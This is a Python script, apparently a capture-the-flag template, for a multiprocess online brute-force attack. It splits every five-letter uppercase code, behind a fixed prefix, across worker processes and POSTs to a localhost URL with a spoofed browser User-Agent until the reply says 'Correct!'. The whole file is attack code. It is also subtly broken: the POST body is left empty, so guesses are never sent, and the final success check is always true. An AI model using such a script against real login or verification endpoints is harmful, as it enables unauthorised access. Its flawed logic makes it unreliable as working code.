import requests
import string
import multiprocessing
import progressbar
from itertools import product


url = "https://localhost"
cookies = {}
headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"}

def brute(chunked_guess_chars, found_code):
	for guess_chars in progressbar.progressbar(chunked_guess_chars):
		if found_code.value:
			break

		guess_code = f"static-part-{guess_chars}"
		data = {}

		# Make sure requests are repeated on failure
		while True:
			try:
				response = requests.post(url, headers=headers, cookies=cookies, data=data)
				if 'Correct!' in response.text:
					found_code.value = guess_code
				break
			except:
				pass

# Prepare guesses in chunks
indexed_guess_chars = []
chunked_guess_chars = []
brute_lenth = 5
chunk_size = round(pow(len(string.ascii_uppercase), brute_lenth) / (multiprocessing.cpu_count() * 2))

for guess_chars in product(string.ascii_uppercase, repeat=brute_lenth):
	chunked_guess_chars.append(''.join(guess_chars))
	if len(chunked_guess_chars) >= chunk_size:
		indexed_guess_chars.append(chunked_guess_chars)
		chunked_guess_chars = []
if len(chunked_guess_chars) > 0:
	indexed_guess_chars.append(chunked_guess_chars)

print("Starting brute force...")

# Start multiprocess brute force
procs = []
manager = multiprocessing.Manager()
found_code = manager.Value('found_code', None)

for proc_n in range(len(indexed_guess_chars)):
	proc = multiprocessing.Process(target=brute, args=(indexed_guess_chars[proc_n],found_code))
	procs.append(proc)
	proc.start()

# Complete the processes
for proc in procs:
    proc.join()

if found_code:
	print(f"\n\nFOUND CODE --> {found_code.value}")
